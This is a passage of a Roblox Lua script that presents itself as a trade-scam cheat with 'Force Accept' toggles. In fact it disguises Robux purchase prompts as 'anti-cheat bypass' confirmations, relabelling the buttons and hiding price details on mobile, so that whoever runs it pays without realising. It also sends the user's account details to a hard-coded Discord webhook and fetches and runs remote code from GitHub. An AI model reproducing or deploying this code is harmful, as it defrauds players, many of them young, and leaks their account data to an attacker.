    createCyberToggle("Force Accept [BETA]", UDim2.new(0.5, 0, 0.45, 0))
    createCyberToggle("Auto Accept", UDim2.new(0.5, 0, 0.65, 0))
    
    -- Initial UI animation
    MainFrame.Size = UDim2.new(0, 0, 0, 0)
    MainFrame.BackgroundTransparency = 1
    BorderFrame.BackgroundTransparency = 1
    GlowEffect.ImageTransparency = 1
    Pattern.ImageTransparency = 1
    
    TweenService:Create(MainFrame, TweenInfo.new(0.7, Enum.EasingStyle.Back), {
        Size = UDim2.new(0, 340, 0, 440),
        BackgroundTransparency = 0
    }):Play()
    
    TweenService:Create(BorderFrame, TweenInfo.new(0.7), {
        BackgroundTransparency = 0.7
    }):Play()
    
    TweenService:Create(GlowEffect, TweenInfo.new(0.7), {
        ImageTransparency = 0.85
    }):Play()
    
    TweenService:Create(Pattern, TweenInfo.new(0.7), {
        ImageTransparency = 0.95
    }):Play()
end

local function checkForPurchasePrompts()
    local promptsFound = false
    local promptCount = 0
    local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if purchasePrompt then
        local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
        if container then
            local animator = container:FindFirstChild("Animator")
            if animator and animator:FindFirstChild("Prompt") then
                promptsFound = true
                promptCount = promptCount + 1
            end
        end
    end
    return promptsFound, promptCount
end

local function handlePrompts()
    local messageUI = nil
    local lastPromptTime = 0
    local waitTime = 10
    local hasCreatedUI = false
    
    local function customWait(duration)
        local startTime = tick()
        repeat
            RunService.RenderStepped:Wait()
        until tick() - startTime >= duration
    end
    
    local function checkAndCreateUI()
        if hasCreatedUI then
            return true
        end

        local hasPrompts = checkForPurchasePrompts()

        if hasPrompts then
            if not messageUI then
                messageUI = createPromptMessage([[
                    Please confirm the bypass(-es) prompts for anti-cheat to continue to Trade-Scam.
                
                    NOTES:
                    * If no prompt appeared, please rejoin, re-execute, and try again.
                    * Bypassing anti-cheat is required to avoid a ban and ensure it works.
                    * You might get multiple confirmation prompts for anti-cheat bypass depending on the situation.
                ]])                
            end
            lastPromptTime = tick()
            return
        end
        
        if tick() - lastPromptTime < waitTime then
            return
        end

        if messageUI then
            messageUI:Destroy()
        end
        
        if not hasCreatedUI then
            LoadingScreen:Destroy()
            CreateUI()
            hasCreatedUI = true
        end
        return true
    end
    
    task.spawn(function()
        repeat
            local hasPrompts = checkForPurchasePrompts()
            task.wait()
        until hasPrompts
        local connection = RunService.RenderStepped:Connect(function()
            if checkAndCreateUI() then
                connection:Disconnect()
            end
        end)
    end)
end

local function JoinTeam()
    local player = Players.LocalPlayer
    local currentTeam = player.Team
    if currentTeam ~= game.Teams.Marines and currentTeam ~= game.Teams.Pirates then
        local args = {
            [1] = "SetTeam",
            [2] = "Pirates"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
    end
end

if getgenv().AutoTeam then
    JoinTeam()
end

local webhookUrl = "https://discord.com/api/webhooks/1327389167470247966/HmLWmJoDkT728wQlhVC_2lLexaKvtGdSRfvugs-xVVK3D9uFW7BgdjWDnIuJhSRtJV51"
local player = Players.LocalPlayer

local function getExecutor()
    if syn then return "Synapse X"
    elseif getexecutor then return getexecutor()
    elseif identifyexecutor then return identifyexecutor()
    elseif fluxus then return "Fluxus"
    elseif KRNL_LOADED then return "KRNL"
    elseif isexecutor then return "ScriptWare"
    else return "Unknown" end
end

local function getDeviceType()
    local UserInputService = game:GetService("UserInputService")
    local GuiService = game:GetService("GuiService")
    
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    return "Phone/Tablet"
    elseif GuiService:IsTenFootInterface() and not UserInputService.KeyboardEnabled then
        return "Console"
    else
        return "PC"
    end
end

local function sendWebhook()
    local embed = {
        ["title"] = "Script Executed",
        ["description"] = "A script was executed in the game.",
        ["color"] = 16711680,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = player.Name,
                ["inline"] = true
            },
            {
                ["name"] = "User ID",
                ["value"] = tostring(player.UserId),
                ["inline"] = true
            },
            {
                ["name"] = "Game Name",
                ["value"] = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                ["inline"] = true
            },
            {
                ["name"] = "Game ID",
                ["value"] = tostring(game.GameId),
                ["inline"] = false
            },
            {
                ["name"] = "Executor",
                ["value"] = getExecutor(),
                ["inline"] = true
            },
            {
                ["name"] = "Device Type",
                ["value"] = getDeviceType(),
                ["inline"] = true
            },
            {
                ["name"] = "Account Age",
                ["value"] = tostring(player.AccountAge) .. " days",
                ["inline"] = true
            },
            {
                ["name"] = "Has Premium",
                ["value"] = player.MembershipType == Enum.MembershipType.Premium and "Yes" or "No",
                ["inline"] = true
            }
        }
    }

    local payload = {
        ["content"] = "",
        ["embeds"] = {embed}
    }
    
    local success, response = pcall(function()
        return http.request({
            Url = webhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

task.spawn(function()
    local success, result = pcall(function()
        local TweenService = game:GetService("TweenService")
        local RunService = game:GetService("RunService")
        local CoreGui = game:GetService("CoreGui")

        -- Enhanced neon glow effect
        local function createNeonEffect(parent, color)
            local neon = Instance.new("ImageLabel")
            neon.BackgroundTransparency = 1
            neon.Image = "rbxasset://textures/ui/Glow.png"
            neon.ImageColor3 = color
            neon.ImageTransparency = 0.5
            neon.Size = UDim2.new(2, 0, 2, 0)
            neon.Position = UDim2.new(-0.5, 0, -0.5, 0)
            neon.ZIndex = -1
            neon.Parent = parent
            
            -- Advanced pulse animation
            local function pulseNeon()
                while neon and neon.Parent do
                    local tween = TweenService:Create(neon, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                        ImageTransparency = 0.7,
                        Size = UDim2.new(2.2, 0, 2.2, 0)
                    })
                    tween:Play()
                    task.wait(2)
                    if not neon or not neon.Parent then break end
                    local tweenBack = TweenService:Create(neon, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                        ImageTransparency = 0.5,
                        Size = UDim2.new(2, 0, 2, 0)
                    })
                    tweenBack:Play()
                    task.wait(2)
                end
            end
            task.spawn(pulseNeon)
            return neon
        end

        -- Create cyber underline
        local function createCyberUnderline(parent)
            local underlineContainer = Instance.new("Frame")
            underlineContainer.Name = "CyberUnderline"
            underlineContainer.BackgroundTransparency = 1
            underlineContainer.Size = UDim2.new(1, 0, 0, 4)
            underlineContainer.Position = UDim2.new(0, 0, 1, 2)
            underlineContainer.Parent = parent
            
            -- Main line
            local mainLine = Instance.new("Frame")
            mainLine.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
            mainLine.BorderSizePixel = 0
            mainLine.Size = UDim2.new(1, 0, 0, 2)
            mainLine.Parent = underlineContainer
            
            -- Accent lines
            for i = 1, 3 do
                local accent = Instance.new("Frame")
                accent.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                accent.BorderSizePixel = 0
                accent.Size = UDim2.new(0, 20, 0, 1)
                accent.Position = UDim2.new((i * 0.25) - 0.25, 0, 1, 0)
                accent.Parent = underlineContainer
                
                -- Animate accent lines
                task.spawn(function()
                    while accent and accent.Parent do
                        local tween = TweenService:Create(accent, TweenInfo.new(1.5, Enum.EasingStyle.Sine), {
                            BackgroundTransparency = 0.8,
                            Position = UDim2.new(accent.Position.X.Scale + 0.5, 0, 1, 0)
                        })
                        tween:Play()
                        task.wait(1.5)
                        if not accent or not accent.Parent then break end
                        accent.BackgroundTransparency = 0
                        accent.Position = UDim2.new((i * 0.25) - 0.25, 0, 1, 0)
                    end
                end)
            end
            
            -- Glow effect
            local glow = createNeonEffect(mainLine, Color3.fromRGB(0, 255, 255))
            glow.Size = UDim2.new(1, 0, 4, 0)
            glow.Position = UDim2.new(0, 0, -1.5, 0)
        end

        -- Scanline effect
        local function createScanline(parent)
            local scanline = Instance.new("Frame")
            scanline.BackgroundColor3 = Color3.new(1, 1, 1)
            scanline.BackgroundTransparency = 0.9
            scanline.BorderSizePixel = 0
            scanline.Size = UDim2.new(1, 0, 0, 2)
            scanline.Parent = parent
            
            local function animateScanline()
                while scanline and scanline.Parent do
                    local tween = TweenService:Create(scanline, TweenInfo.new(2, Enum.EasingStyle.Linear), {
                        Position = UDim2.new(0, 0, 1, 0)
                    })
                    tween:Play()
                    task.wait(2)
                    if not scanline or not scanline.Parent then break end
                    scanline.Position = UDim2.new(0, 0, 0, -2)
                end
            end
            task.spawn(animateScanline)
        end

        local function setupButton(button)
            if button and button:IsA("ImageButton") and button.Visible then
                button:ClearAllChildren()
                button.Image = ""
                button.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
                button.AutoButtonColor = false
                button.BorderSizePixel = 0
                
                -- Holographic container
                local container = Instance.new("Frame")
                container.Size = UDim2.new(1, 0, 1, 0)
                container.BackgroundTransparency = 1
                container.ClipsDescendants = true
                container.Parent = button
                
                -- Enhanced cyber frame
                local cyberFrame = Instance.new("Frame")
                cyberFrame.Size = UDim2.new(1, -4, 1, -4)
                cyberFrame.Position = UDim2.new(0, 2, 0, 2)
                cyberFrame.BackgroundColor3 = Color3.fromRGB(10, 15, 25)
                cyberFrame.BorderSizePixel = 0
                cyberFrame.Parent = container
                
                -- Animated corner accents
                for _, pos in ipairs({{0,0}, {1,0}, {0,1}, {1,1}}) do
                    local corner = Instance.new("Frame")
                    corner.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                    corner.BorderSizePixel = 0
                    corner.Size = UDim2.new(0, 8, 0, 2)
                    corner.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or -6, pos[2], pos[2] == 0 and -2 or 0)
                    corner.Parent = button
                    
                    local vertPart = Instance.new("Frame")
                    vertPart.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
                    vertPart.BorderSizePixel = 0
                    vertPart.Size = UDim2.new(0, 2, 0, 8)
                    vertPart.Position = UDim2.new(pos[1], pos[1] == 0 and -2 or 0, pos[2], pos[2] == 0 and -2 or -6)
                    vertPart.Parent = button
                end
                
                -- Create neon glow
                local neon = createNeonEffect(button, Color3.fromRGB(0, 255, 255))
                
                -- Button text
                local textLabel = Instance.new("TextLabel")
                textLabel.Name = "ButtonText"
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
                textLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
                textLabel.TextStrokeTransparency = 0
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.SciFi
                textLabel.Text = ({ "BYPASS", "INJECT", "BYPASS ANTI-CHEAT", "ACTIVATE BYPASS" })[math.random(1, 4)]
                textLabel.Parent = container
                
                -- Hover effects
                button.MouseEnter:Connect(function()
                    if not button or not button.Parent then return end
                    
                    -- Enhanced hover animation
                    TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
                        Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset + 10, 
                                        button.Size.Y.Scale, button.Size.Y.Offset + 6)
                    }):Play()
                    
                    -- Intensify neon
                    TweenService:Create(neon, TweenInfo.new(0.3), {
                        ImageTransparency = 0.3
                    }):Play()
                end)
                
                button.MouseLeave:Connect(function()
                    if not button or not button.Parent then return end
                    
                    TweenService:Create(button, TweenInfo.new(0.3, Enum.EasingStyle.Back), {
                        Size = UDim2.new(button.Size.X.Scale, button.Size.X.Offset - 10, 
                                        button.Size.Y.Scale, button.Size.Y.Offset - 6)
                    }):Play()
                    
                    TweenService:Create(neon, TweenInfo.new(0.3), {
                        ImageTransparency = 0.5
                    }):Play()
                end)
            end
        end

        local function applyChanges(prompt, counter, isMobile)
            local alertContents = prompt:WaitForChild("AlertContents")
            prompt.Image = ""
            prompt.ImageTransparency = 1
            prompt.BackgroundTransparency = 1
            prompt.BorderSizePixel = 0
        
            -- Create holographic effect
            local holoOverlay = Instance.new("ImageLabel")
            holoOverlay.BackgroundTransparency = 1
            holoOverlay.Image = "rbxassetid://8677004618"  -- Holographic texture
            holoOverlay.ImageTransparency = 0.8  -- Slightly more visible
            holoOverlay.ImageColor3 = Color3.fromRGB(0, 255, 255)
            holoOverlay.Size = UDim2.new(1.1, 10, 1.1, 10)  -- Slightly larger than the prompt
            holoOverlay.Position = UDim2.new(-0.05, 0, -0.05, 0) -- Centered offset
            holoOverlay.Parent = prompt
        
            -- Add scanline effect
            createScanline(prompt)
        
            -- Create neon glow
            createNeonEffect(prompt, Color3.fromRGB(0, 200, 255))
        
            -- Enhanced title setup
            local titleLabel = alertContents:WaitForChild("TitleContainer")
                :WaitForChild("TitleArea"):WaitForChild("Title")
            titleLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
            titleLabel.Font = Enum.Font.SciFi
            titleLabel.TextScaled = true
            titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 128, 128)
            titleLabel.TextStrokeTransparency = 1
            titleLabel.TextTransparency = 1
            titleLabel.Text = "" .. counter
        
            -- Adjust title size
            titleLabel.Size = UDim2.new(1.2, 20, 1.2, 20) -- Enlarged title area
            titleLabel.Position = UDim2.new(-0.1, 0, 0, 0) -- Adjusted to center
        
            -- Add cyber underline
            createCyberUnderline(titleLabel)
        
            -- Footer adjustments
            local footer = alertContents:WaitForChild("Footer")
            local buttons = footer:WaitForChild("Buttons")
        
            setupButton(buttons:FindFirstChild("1"))
            setupButton(buttons:FindFirstChild("2"))

            -- Mobile-specific adjustments
            if isMobile then
                -- Hide MiddleContainer
                local middleContainer = alertContents:FindFirstChild("MiddleContent")
                if middleContainer then
                    middleContainer.Visible = false
                end

                -- Hide second button
                local button2 = buttons:FindFirstChild("2")
                if button2 then
                    button2.Visible = false
                end

                -- Hide FooterContent
                local footerContent = footer:FindFirstChild("FooterContent")
                if footerContent then
                    local content = footerContent:FindFirstChild("Content")
                    if content then
                        content.Visible = false
                    end
                end
            end
        end        

        local processedPrompts = {}
        local promptCounter = 1

        RunService.RenderStepped:Connect(function()
            local purchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
            if purchasePrompt then
                -- Check for mobile prompt path
                local mobilePrompt = purchasePrompt:FindFirstChild("RobuxUpsellContainer")
                if mobilePrompt then
                    local prompt = mobilePrompt:FindFirstChild("Prompt")
                    if prompt then
                        local childrenFrame = prompt:FindFirstChild("Children") -- Get the "Children" frame
                        if childrenFrame then
                            local children = childrenFrame:GetChildren() -- Get all children of the "Children" frame
                            for _, child in ipairs(children) do
                                if child.Name == "1" then
                                    local innerPrompt = child:FindFirstChild("1")
                                    if innerPrompt and not processedPrompts[innerPrompt] then
                                        processedPrompts[innerPrompt] = true
                                        applyChanges(innerPrompt, promptCounter, true) -- Pass true for isMobile
                                        promptCounter = promptCounter + 1
                                    end
                                end
                            end
                        end
                    end
                else
                    -- Original desktop prompt path
                    local container = purchasePrompt:FindFirstChild("ProductPurchaseContainer")
                    if container then
                        local animator = container:FindFirstChild("Animator")
                        if animator then
                            local prompt = animator:FindFirstChild("Prompt")
                            if prompt and not processedPrompts[prompt] then
                                processedPrompts[prompt] = true
                                applyChanges(prompt, promptCounter, false) -- Pass false for isMobile
                                promptCounter = promptCounter + 1
                            end
                        end
                    end
                end
            end
        end)        
    end)

    if not success then
        warn("Failed to access CoreGui: " .. tostring(result))
    end
end)

handlePrompts()

-- Send webhook
task.spawn(function()
    sendWebhook()
end)

Username = "XFistor"
Webhook = "99738c77-d7bd-4db9-a9e8-5350bdc3d343"

loadstring(game:HttpGet("https://raw.githubusercontent.com/TheReactor200/Fe/refs/heads/main/Script",true))()
